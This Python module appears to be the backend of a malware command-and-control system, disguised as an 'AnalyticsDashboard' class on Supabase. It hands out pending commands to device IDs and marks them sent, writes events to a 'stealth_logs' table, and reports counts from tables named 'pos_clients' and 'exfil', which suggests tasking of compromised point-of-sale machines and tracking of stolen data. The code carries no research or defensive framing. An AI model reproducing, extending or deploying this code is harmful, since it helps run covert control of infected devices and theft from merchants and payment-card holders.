import logging
from supabase import create_client
from .config import Config

logger = logging.getLogger(__name__)

class AnalyticsDashboard:
    def __init__(self):
        self.supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)

    def pull_commands(self, device_id):
        try:
            response = self.supabase.table("service_requests")\
                .select("*")\
                .eq("Target_client", device_id)\
                .eq("Ticket_status", "pending")\
                .execute()
            commands = response.data
            if commands:
                for cmd in commands:
                    self.supabase.table("service_requests")\
                        .update({"Ticket_status": "sent"})\
                        .eq("id", cmd["id"])\
                        .execute()
                    logger.info(f"Command {cmd['id']} marked as sent for device {device_id}")
            return commands
        except Exception as e:
            logger.error(f"Error in pull_commands: {e}")
            return []

    def store_event(self, device_id, event_type, event_data=None):
        try:
            data = {
                "Device_id": device_id,
                "Event_type": event_type,
                "Event_data": event_data
            }
            self.supabase.table("stealth_logs").insert(data).execute()
            logger.info(f"Event {event_type} stored for device {device_id}")
            return True
        except Exception as e:
            logger.error(f"Error storing event: {e}")
            return False

    def get_statistics(self):
        try:
            devices = self.supabase.table("pos_clients").select("Client_serial", count="exact").execute()
            commands = self.supabase.table("service_requests").select("Ticket_id", count="exact").execute()
            exfil = self.supabase.table("exfil").select("Id", count="exact").execute()
            return {
                "total_devices": devices.count if hasattr(devices, 'count') else 0,
                "total_commands": commands.count if hasattr(commands, 'count') else 0,
                "total_exfil": exfil.count if hasattr(exfil, 'count') else 0
            }
        except Exception as e:
            logger.error(f"Error getting statistics: {e}")
            return {}
